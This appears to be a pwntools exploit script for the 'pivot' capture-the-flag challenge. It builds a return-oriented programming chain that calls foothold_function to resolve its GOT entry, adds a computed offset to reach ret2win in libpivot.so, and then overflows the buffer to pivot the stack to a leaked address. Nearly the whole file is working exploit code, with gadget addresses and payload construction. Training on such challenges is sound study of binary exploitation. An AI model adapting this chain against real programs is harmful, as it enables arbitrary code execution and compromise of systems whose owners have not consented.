from pwn import *
import re


def to_clipboard(data):
    from subprocess import Popen, PIPE
    xsel = Popen(['xsel', '-bi'], stdin=PIPE)
    xsel.communicate(input=data)
    log.info(f"put to clipboard: {data}")


def update_gdb_attach(binary, attach_file="attach.gdb"):
    pid = process(["pgrep", binary]).recvall()
    update_script = "/home/kali/bin/update-attach-gdb.sh"
    process([update_script, attach_file, pid])
    to_clipboard(pid)


def call_resolved_adr_with_off(adr, offset):
    # MOVE GOT ADR INTO REG
    # 0x00000000004009bb : pop rax ; ret
    pop_rax_gadget = pack(0x00000000004009bb, 64)
    # 0x00000000004009c0 : mov rax, qword ptr [rax] ; ret
    lea_into_rax_gadget = pack(0x00000000004009c0, 64)

    # ARITHMETIC GADGETS
    # 0x00000000004007c8 : pop rbp ; ret
    pop_rbp_gadget = pack(0x00000000004007c8, 64)
    # 0x00000000004009c4 : add rax, rbp ; ret
    add_rax_rbp_gadget = pack(0x00000000004009c4, 64)

    # CALL GADGETS
    # 0x00000000004006b0 : call rax
    call_rax_gadget = pack(0x00000000004006b0, 64)

    chain = b""
    chain += pop_rax_gadget
    chain += pack(adr, 64)
    # foot got entry adr is in eax now
    chain += lea_into_rax_gadget
    # real foot adr is now in eax
    chain += pop_rbp_gadget
    chain += pack(offset, 64)
    chain += add_rax_rbp_gadget
    # real foot adr + offset = real ret2win adr
    chain += call_rax_gadget
    return chain


binary = "pivot"

lib = ELF("./libpivot.so")
elf = ELF("./"+binary)

# before calling foothold_function
# got
# 123 foothold_function : bullshit

# after calling foothold_function
# got
# 123 foothold_function : realAdr

# puts(123)


foot_plt = elf.plt["foothold_function"]
puts_plt = elf.plt["puts"]
foot_got = elf.got["foothold_function"]
exit_plt = elf.plt["exit"]

ret2win_off = lib.symbols["ret2win"]
log.info(f"ret2win_off: {ret2win_off}")
foothold_function_off = lib.symbols["foothold_function"]
log.info(f"foothold_function_off: {foothold_function_off}")

lib_function_offset = ret2win_off - foothold_function_off
log.info(f"lib_function_offset: {lib_function_offset}")


log.info("foot_plt: " + hex(foot_plt) + f" {foot_plt}")
log.info("puts_plt: " + hex(puts_plt) + f" {puts_plt}")
log.info("foot_got: " + hex(foot_got) + f" {foot_got}")
log.info("exit_plt: " + hex(exit_plt) + f" {exit_plt}")


def pivot_to_adr(adr):
    # 0x00000000004007c8 : pop rbp ; ret
    pop_rbp_gadget = 0x00000000004007c8
    # 0x00000000004008ef : leave ; ret
    mov_rbp_into_rsp_gadget = 0x00000000004008ef

    chain = b""
    chain += pack(pop_rbp_gadget, 64)
    chain += pack(adr-8, 64)
    chain += pack(mov_rbp_into_rsp_gadget, 64)
    return chain


p = process([binary])
r = p.recv().decode("utf-8")
log.info(f"r: {r}")

sleep(3)


index = r.find("0x7")
pivot_adr = r[index:index+18].split("\n")[0]
log.info(f"pivot_adr: {pivot_adr}")

pivot_adr = int(pivot_adr, 16)
log.info(f"pivot_adr: {pivot_adr}")


update_gdb_attach(binary)

# LEAK REAL FOOT ADR
# payload = b""
# payload += pack(foot_plt, 64)
# payload += pack(puts_plt, 64)
# payload += pack(exit_plt, 64)   # ret
# payload += pack(foot_got, 64)


# pop foot_got adr in eax
# mov real foot adr in eax
# pop offset into ebx
# add offset to eax (real foot adr) -> eax contains real adr of ret2win
# call eax -> call real adr of ret2win

payload = b""
payload += pack(foot_plt, 64)
# now foot got entry is updated
payload += call_resolved_adr_with_off(foot_got, lib_function_offset)
payload += pack(exit_plt, 64)
payload += b"B"*8
payload += b"gill"*2


log.info(f"first payload: {payload}")
write("/tmp/docgil", payload)

input("before first payload send")

p.send(payload)
r = p.recv()
log.info(f"r: {r}")


payload = b""
payload += b"A"*40
payload += pivot_to_adr(pivot_adr)


log.info(f"second payload: {payload}")
write("/tmp/docgil2", payload)

input("before second payload send")


p.send(payload)
r = p.recvall()

log.info(f"r : {r }")


# r = p.recvall().replace(b"Thank you!\n", b"")
# log.info(f"r: {r}")
# foot_got_val = unpack(r[:4], 64)
# log.info("foot_got_val: " + hex(foot_got_val) + f" {foot_got_val}")
